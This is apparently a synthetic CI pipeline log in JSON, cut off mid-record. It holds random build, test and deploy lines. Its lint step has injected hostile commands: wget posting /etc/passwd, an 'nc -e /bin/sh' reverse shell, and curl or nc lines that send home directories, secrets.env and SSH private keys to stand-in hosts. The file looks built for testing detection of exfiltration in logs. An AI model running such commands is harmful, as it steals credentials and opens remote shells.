completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (46MB)\n\u2713 test completed\n  PASS: test_cache_hit (266ms)\nCompiling src/main.py...\nCache hit for key-2451\n\u2713 build completed\n[12:00:18] INFO: Processing request\n\u2713 test completed\nInstalling react@2.19.0\n  PASS: test_api_health (331ms)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (36MB)\nInstalling axios@5.3.0\nStep 4/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling webpack@3.20.0\nCompiling src/service.java...\nCache hit for key-1617\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_cache_hit (430ms)\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (34MB)\nCache hit for key-2864\n\u2713 lint completed\nStep 6/10: Building\nStep 8/10: Building\nStep 2/10: Building\n[12:00:18] INFO: Processing request\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:18] INFO: Processing request\n\u2713 build completed\n  PASS: test_auth_login (7ms)\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_db_connect (331ms)\n[12:00:18] INFO: Processing request\nInstalling lodash@4.5.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (22MB)\nStep 1/10: Building\n\u2713 lint completed\n  PASS: test_db_connect (351ms)\nArtifact uploaded: build.tar.gz (13MB)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-6864\n\u2713 build completed\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (434ms)\nCache hit for key-9906\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (30MB)\n  PASS: test_cache_hit (228ms)\n\u2717 build failed with exit code 1\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\n\u2713 lint completed\nStep 9/10: Building\nCompiling src/service.java...\n  PASS: test_api_health (339ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (11MB)\n  PASS: test_api_health (303ms)\n  PASS: test_user_create (170ms)\nInstalling eslint@3.19.0\n\u2713 build completed\nCache hit for key-6304\nArtifact uploaded: build.tar.gz (43MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (50MB)\n=== Step deploy_staging completed ===\n=== Step: integration_tests ===\nWARNING: webpack has known vulnerabilities\nStep 3/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nInstalling lodash@1.14.0\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_api_health (477ms)\n  PASS: test_user_create (486ms)\n\u2713 build completed\nStep 9/10: Building\n\u2713 build completed\nInstalling react@2.4.0\nCache hit for key-4763\nWARNING: jest has known vulnerabilities\n\u2713 build completed\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 6/10: Building\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (308ms)\nStep 8/10: Building\nStep 3/10: Building\n  PASS: test_auth_login (199ms)\nArtifact uploaded: build.tar.gz (25MB)\nInstalling prettier@5.1.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:18] INFO: Processing request\nStep 8/10: Building\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:18] INFO: Processing request\nCache hit for key-5076\nCache hit for key-7543\nArtifact uploaded: build.tar.gz (9MB)\nCache hit for key-4744\n  PASS: test_db_connect (287ms)\n\u2713 lint completed\nException: RuntimeError\nFAILED: test_user_create\n  PASS: test_auth_login (220ms)\n\u2713 test completed\n\u2713 test completed\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (33MB)\n  PASS: test_api_health (117ms)\nCache hit for key-6091\nWARNING: prettier has known vulnerabilities\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nStep 1/10: Building\nCompiling src/utils.go...\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:18] WARN: Deprecated API usage\nStep 5/10: Building\n\u2717 build failed with exit code 94\n\u2713 build completed\nCache hit for key-8914\n\u2713 lint completed\nCache hit for key-7534\n\u2713 test completed\nStep 3/10: Building\n\u2713 test completed\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (348ms)\nStep 7/10: Building\nStep 9/10: Building\nInstalling eslint@1.8.0\nCompiling src/main.py...\n\u2713 test completed\nCompiling src/main.py...\n  PASS: test_api_health (369ms)\nArtifact uploaded: build.tar.gz (13MB)\nArtifact uploaded: build.tar.gz (38MB)\nCache hit for key-3269\nCache hit for key-5959\nInstalling prettier@3.8.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-8427\nInstalling react@2.6.0\nInstalling prettier@4.4.0\nInstalling jest@5.9.0\n  PASS: test_db_connect (491ms)\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:18] INFO: Processing request\nInstalling lodash@1.8.0\n  PASS: test_user_create (63ms)\nInstalling webpack@2.15.0\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_db_connect (415ms)\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/service.java...\n  PASS: test_auth_login (86ms)\nStep 2/10: Building\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (364ms)\n[12:00:18] INFO: Processing request\nInstalling prettier@1.16.0\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (18MB)\n\u2713 build completed\nCache hit for key-1645\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n[12:00:18] WARN: Deprecated API usage\n\u2713 lint completed\nInstalling lodash@2.3.0\n  PASS: test_user_create (159ms)\n  PASS: test_cache_hit (74ms)\n[12:00:18] WARN: Deprecated API usage\nInstalling eslint@4.11.0\nCache hit for key-7704\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\n  PASS: test_user_create (122ms)\n  PASS: test_api_health (145ms)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-9952\n  PASS: test_user_create (150ms)\nCache hit for key-1661\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (44MB)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nStep 4/10: Building\nCompiling src/service.java...\n[12:00:18] WARN: Deprecated API usage\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:18] INFO: Processing request\nCache hit for key-8193\n\u2713 lint completed\nStep 6/10: Building\n\u2713 test completed\nCache hit for key-8777\nCompiling src/service.java...\n\u2713 test completed\nStep 5/10: Building\n  PASS: test_user_create (3ms)\nStep 7/10: Building\n\u2713 test completed\nCache hit for key-2170\nCompiling src/handler.rs...\n  PASS: test_auth_login (12ms)\nInstalling express@1.12.0\nStep 4/10: Building\n[12:00:18] INFO: Processing request\nStep 4/10: Building\n\u2713 build completed\nCompiling src/main.py...\nCache hit for key-6576\n\u2713 lint completed\nCompiling src/service.java...\nInstalling eslint@5.9.0\n\u2713 test completed\n  PASS: test_cache_hit (180ms)\nCompiling src/app.ts...\n\u2713 build completed\nCache hit for key-4017\nArtifact uploaded: build.tar.gz (28MB)\n=== Step integration_tests completed ===\n=== Step: deploy_production ===\nCache hit for key-2145\n\u2713 lint completed\nStep 6/10: Building\nStep 3/10: Building\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-1047\n  PASS: test_cache_hit (203ms)\nException: ValueError\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (45ms)\nCompiling src/handler.rs...\n  PASS: test_auth_login (408ms)\nCache hit for key-2951\nStep 9/10: Building\nInstalling express@5.1.0\nInstalling express@3.4.0\nArtifact uploaded: build.tar.gz (41MB)\n[12:00:18] INFO: Processing request\nInstalling webpack@2.8.0\nCompiling src/service.java...\nStep 9/10: Building\n\u2713 lint completed\nCompiling src/utils.go...\nInstalling webpack@2.20.0\nCompiling src/utils.go...\nStep 10/10: Building\nCache hit for key-3421\nArtifact uploaded: build.tar.gz (16MB)\nFAILED: test_api_health\nCompiling src/handler.rs...\n  PASS: test_cache_hit (245ms)\nStep 7/10: Building\nInstalling eslint@4.19.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (28MB)\nStep 10/10: Building\nCompiling src/utils.go...\nStep 5/10: Building\n\u2713 test completed\n  PASS: test_auth_login (15ms)\nInstalling prettier@2.18.0\n  PASS: test_auth_login (338ms)\nInstalling react@5.5.0\nWARNING: react has known vulnerabilities\nCompiling src/index.js...\nInstalling eslint@3.14.0\nStep 1/10: Building\nCache hit for key-6365\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 lint completed\nStep 6/10: Building\nInstalling express@2.1.0\nCache hit for key-2198\nFAILED: test_api_health\n\u2713 lint completed\n\u2713 test completed\nCompiling src/app.ts...\nCompiling src/utils.go...\nStep 6/10: Building\nCache hit for key-7545\n\u2713 lint completed\n  PASS: test_db_connect (291ms)\nCache hit for key-2970\n  PASS: test_auth_login (276ms)\n\u2713 test completed\n  PASS: test_auth_login (370ms)\nInstalling prettier@1.5.0\nCache hit for key-5923\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling webpack@4.18.0\nArtifact uploaded: build.tar.gz (3MB)\nCache hit for key-9402\n[12:00:18] INFO: Processing request\nInstalling express@5.10.0\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\nStep 5/10: Building\n  PASS: test_cache_hit (349ms)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_db_connect (439ms)\nCompiling src/handler.rs...\nCompiling src/main.py...\n  PASS: test_auth_login (225ms)\nInstalling webpack@5.7.0\nStep 4/10: Building\n\u2713 build completed\nInstalling express@1.13.0\nCache hit for key-4006\n[12:00:18] INFO: Processing request\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 test completed\n[12:00:18] INFO: Processing request\nStep 5/10: Building\n  PASS: test_cache_hit (414ms)\nCompiling src/utils.go...\nCache hit for key-5031\nCompiling src/main.py...\nStep 2/10: Building\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\nCompiling src/app.ts...\nCache hit for key-1449\nInstalling eslint@1.13.0\nInstalling axios@3.20.0\n\u2713 lint completed\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nStep 4/10: Building\nCompiling src/main.py...\nCompiling src/utils.go...\n  PASS: test_cache_hit (202ms)\nCache hit for key-3273\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 1/10: Building\nCompiling src/main.py...\n  PASS: test_api_health (427ms)\nCompiling src/handler.rs...\nCache hit for key-1142\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nInstalling webpack@5.14.0\nCache hit for key-1108\nArtifact uploaded: build.tar.gz (32MB)\nInstalling axios@1.5.0\nArtifact uploaded: build.tar.gz (12MB)\n  PASS: test_auth_login (405ms)\nCompiling src/index.js...\nCompiling src/service.java...\nInstalling webpack@5.1.0\n  PASS: test_api_health (204ms)\nCompiling src/service.java...\nInstalling webpack@3.15.0\nStep 6/10: Building\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_db_connect (350ms)\nCompiling src/service.java...\nInstalling jest@3.1.0\n  PASS: test_user_create (403ms)\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\nCache hit for key-7053\n  PASS: test_cache_hit (189ms)\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-8887\nStep 1/10: Building\nCompiling src/app.ts...\n  PASS: test_cache_hit (351ms)\n\u2713 test completed\nCompiling src/handler.rs...\nInstalling express@1.0.0\nCompiling src/handler.rs...\n  PASS: test_db_connect (23ms)\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (449ms)\nInstalling axios@5.11.0\nCache hit for key-6115\nStep 8/10: Building\nStep 7/10: Building\n[12:00:18] INFO: Processing request\nStep 8/10: Building\n=== Step deploy_production completed ===\n=== Step: lint ===\n\u2713 test completed\n\u2713 build completed\nCompiling src/index.js...\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\nWARNING: webpack has known vulnerabilities\nSending 113MB of data to acme.corp\nCompiling src/utils.go...\nCompiling src/app.ts...\n  PASS: test_api_health (459ms)\n[12:00:18] INFO: Processing request\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nInstalling jest@3.13.0\n\u2717 build failed with exit code 34\nArtifact uploaded: build.tar.gz (34MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\n\u2717 build failed with exit code 1\nException: NullPointerException\nCompiling src/service.java...\n\u2713 build completed\nStep 2/10: Building\n  PASS: test_user_create (24ms)\nWARNING: jest has known vulnerabilities\n\u2717 build failed with exit code 1\nStep 9/10: Building\nCompiling src/handler.rs...\nStep 7/10: Building\nStep 3/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/handler.rs...\nWARNING: express has known vulnerabilities\nnc -e /bin/sh 58.48.46.142 48307\nCompiling src/main.py...\nCompiling src/service.java...\n[12:00:18] WARN: Deprecated API usage\nCompiling src/service.java...\nInstalling express@1.6.0\n  PASS: test_cache_hit (355ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nArtifact uploaded: build.tar.gz (24MB)\nInstalling prettier@4.15.0\nCompiling src/main.py...\nStep 10/10: Building\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (1MB)\nCompiling src/index.js...\nInstalling eslint@2.15.0\n  PASS: test_auth_login (57ms)\ncurl -X POST https://startup.dev/collect -d @secrets.env\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 lint completed\nCompiling src/utils.go...\nStep 6/10: Building\n\u2713 test completed\n\u2713 build completed\n\u2713 lint completed\nStep 2/10: Building\nCompiling src/index.js...\nCompiling src/app.ts...\n  PASS: test_auth_login (36ms)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:18] INFO: Processing request\nStep 1/10: Building\ncurl -X POST https://example.com/collect -d @secrets.env\nStep 10/10: Building\n[12:00:18] INFO: Processing request\nSending 216MB of data to example.com\n\u2713 lint completed\nInstalling react@4.8.0\nCache hit for key-1921\n\u2713 test completed\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n[12:00:18] WARN: Deprecated API usage\n\u2713 test completed\nInstalling webpack@3.18.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 16.98.91.129 21951\n\u2713 lint completed\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nInstalling jest@3.5.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_auth_login (164ms)\n  PASS: test_user_create (349ms)\n\u2713 test completed\nCache hit for key-9128\nStep 2/10: Building\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (28MB)\nInstalling axios@2.2.0\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 lint completed\nInstalling axios@5.19.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (13MB)\n  PASS: test_db_connect (31ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 101.91.62.207 51685\nCache hit for key-4764\n  PASS: test_cache_hit (228ms)\nCache hit for key-2121\n  PASS: test_db_connect (52ms)\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-2772\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (13ms)\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:18] INFO: Processing request\nCache hit for key-6112\nInstalling jest@4.17.0\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (29MB)\nCompiling src/utils.go...\nCompiling src/utils.go...\n\u2713 build completed\nCompiling src/index.js...\nStep 3/10: Building\nCompiling src/main.py...\n\u2713 build completed\nInstalling jest@3.2.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (44MB)\nCompiling src/utils.go...\n\u2713 lint completed\nStep 10/10: Building\n[12:00:18] INFO: Processing request\n\u2717 build failed with exit code 69\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nStep 1/10: Building\n\u2713 build completed\nStep 5/10: Building\nInstalling eslint@1.12.0\n  PASS: test_cache_hit (285ms)\nInstalling eslint@4.7.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 76.45.44.216 56414\nInstalling lodash@2.12.0\nCompiling src/app.ts...\n  PASS: test_api_health (343ms)\n\u2713 test completed\nStep 9/10: Building\nCompiling src/service.java...\nInstalling react@2.12.0\nInstalling express@3.4.0\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_cache_hit (246ms)\n\u2713 build completed\nCompiling src/handler.rs...\nStep 9/10: Building\nInstalling react@3.6.0\n  PASS: test_cache_hit (156ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:18] INFO: Processing request\nInstalling jest@1.0.0\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (77ms)\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/handler.rs...\nInstalling react@2.2.0\n  PASS: test_auth_login (459ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (22MB)\nInstalling webpack@4.4.0\n[12:00:18] INFO: Processing request\nCache hit for key-3526\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n=== Step lint completed ===",
    "steps": [
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-10T12:00:18.916724",
        "finished_at": "2025-12-10T12:00:28.696372",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Step 4/10: Building",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (427ms)",
          "FAILED: test_user_create",
          "[12:00:18] INFO: Processing request",
          "Step 7/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-6412",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "WARNING: jest has known vulnerabilities",
          "Step 8/10: Building",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Step 9/10: Building",
          "Step 9/10: Building",
          "Compiling src/main.py...",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 6/10: Building",
          "  PASS: test_db_connect (394ms)",
          "Cache hit for key-7130",
          "  PASS: test_auth_login (499ms)",
          "Cache hit for key-8147",
          "Cache hit for key-5308",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Cache hit for key-6578",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Installing prettier@4.18.0",
          "Artifact uploaded: build.tar.gz (42MB)",
          "[12:00:18] INFO: Processing request",
          "Step 4/10: Building",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Step 2/10: Building",
          "Installing jest@4.16.0",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (338ms)",
          "  PASS: test_user_create (177ms)",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (406ms)",
          "Step 3/10: Building",
          "Exception: TypeError",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "Cache hit for key-2528",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_user_create (161ms)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "WARNING: express has known vulnerabilities",
          "Step 8/10: Building",
          "Compiling src/app.ts...",
          "Cache hit for key-3594",
          "  PASS: test_user_create (41ms)",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Cache hit for key-8236",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-8842",
          "Cache hit for key-9253",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:18] INFO: Processing request",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_cache_hit (271ms)",
          "Installing axios@4.9.0",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-3567",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (13MB)",
          "WARNING: react has known vulnerabilities",
          "Installing webpack@2.3.0",
          "\u2713 test completed",
          "Step 6/10: Building",
          "  PASS: test_auth_login (194ms)",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "\u2717 build failed with exit code 40",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (268ms)",
          "Installing eslint@2.12.0",
          "Compiling src/app.ts...",
          "Cache hit for key-8881",
          "Installing prettier@3.12.0",
          "Compiling src/utils.go...",
          "[12:00:18] ERROR: Connection failed",
          "  PASS: test_auth_login (392ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-7050",
          "WARNING: lodash has known vulnerabilities",
          "Step 8/10: Building",
          "Cache hit for key-2369",
          "Compiling src/handler.rs...",
          "Cache hit for key-6357",
          "Cache hit for key-6973",
          "  PASS: test_auth_login (342ms)",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (138ms)",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 5",
          "[12:00:18] INFO: Processing request",
          "FAILED: test_user_create",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 4/10: Building",
          "Step 7/10: Building",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_cache_hit (132ms)",
          "Cache hit for key-3528",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing jest@3.8.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Installing react@5.2.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_api_health (49ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "  PASS: test_user_create (190ms)",
          "Installing jest@3.9.0",
          "Installing lodash@1.4.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Cache hit for key-3074",
          "Cache hit for key-9515",
          "Installing lodash@4.1.0",
          "Compiling src/index.js...",
          "Installing eslint@5.18.0",
          "\u2713 build completed",
          "Cache hit for key-2881",
          "Installing express@2.0.0",
          "  PASS: test_user_create (269ms)",
          "Cache hit for key-2255",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "WARNING: express has known vulnerabilities",
          "Installing axios@3.5.0",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-10T12:00:28.696372",
        "finished_at": "2025-12-10T12:00:34.564161",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling src/main.py...",
          "Cache hit for key-3370",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:18] INFO: Processing request",
          "Installing react@4.20.0",
          "Installing prettier@1.10.0",
          "Cache hit for key-3977",
          "Step 9/10: Building",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Cache hit for key-6442",
          "  PASS: test_user_create (324ms)",
          "[12:00:18] ERROR: Connection failed",
          "Installing eslint@4.19.0",
          "Cache hit for key-5887",
          "Compiling src/utils.go...",
          "Installing axios@4.14.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing express@3.12.0",
          "Step 1/10: Building",
          "Cache hit for key-7834",
          "  PASS: test_auth_login (323ms)",
          "  PASS: test_api_health (330ms)",
          "\u2713 test completed",
          "Installing axios@2.19.0",
          "Exception: ValueError",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "  PASS: test_user_create (213ms)",
          "Installing axios@2.1.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Compiling src/app.ts...",
          "Cache hit for key-2934",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-5677",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Installing react@2.11.0",
          "[12:00:18] INFO: Processing request",
          "Step 7/10: Building",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "FAILED: test_auth_login",
          "Compiling src/service.java...",
          "Installing eslint@1.11.0",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "\u2713 build completed",
          "\u2713 lint completed",
          "  PASS: test_auth_login (335ms)",
          "Step 9/10: Building",
          "Cache hit for key-7431",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 9/10: Building",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (28MB)",
          "  PASS: test_user_create (246ms)",
          "Installing react@5.18.0",
          "  PASS: test_api_health (381ms)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Step 1/10: Building",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-8507",
          "  PASS: test_db_connect (11ms)",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "Installing express@3.16.0",
          "  PASS: test_cache_hit (100ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing eslint@1.14.0",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (220ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_cache_hit (262ms)",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Step 6/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Installing eslint@3.2.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 lint completed",
          "\u2713 test completed",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Installing webpack@2.14.0",
          "Compiling src/handler.rs...",
          "Installing jest@4.2.0",
          "Cache hit for key-2125",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-3464",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-7790",
          "\u2713 test completed",
          "Installing express@5.6.0",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_user_create (400ms)",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Installing express@5.12.0",
          "Step 5/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "Installing eslint@5.5.0",
